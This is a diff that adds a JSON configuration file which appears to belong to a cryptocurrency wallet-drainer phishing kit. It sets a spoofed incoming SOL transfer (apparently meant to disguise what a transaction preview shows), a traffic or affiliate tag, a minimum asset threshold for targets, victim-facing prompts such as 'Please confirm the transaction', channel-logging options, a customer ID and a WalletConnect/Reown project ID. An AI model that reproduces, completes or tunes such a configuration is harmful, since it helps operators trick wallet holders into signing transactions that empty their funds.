@@ -1,0 +1,21 @@
+{
+  "SPOOF": [
+    {
+      "from": "4ZJhPQAgUseCsWhKvJLTmmRRUV74fdoTpQLNfKoekbPY",
+      "mint": "SOL",
+      "amount": "5000000000"
+    }
+  ],
+  "TRAFFIC": "Eleven my bestie!",
+  "MODAL_AUTOOPEN": false,
+  "ASSET_MIN": "10",
+  "DARK_MODE": true,
+  "LOADING_MESSAGE": "Processing",
+  "CONFIRM_MESSAGE": "Please confirm the transaction",
+  "ERROR_MESSAGE": "Please connect another wallet",
+  "LOGS_TO_THE_CHANNEL": "0",
+  "FULL_LOG_URL": false,
+  "SIG_CONFIG": [],
+  "CUSTOMER_ID": "E83F-F7C2-5F15",
+  "REOWN_ID": "2e149567ef86e6af702071858dad334d"
+}
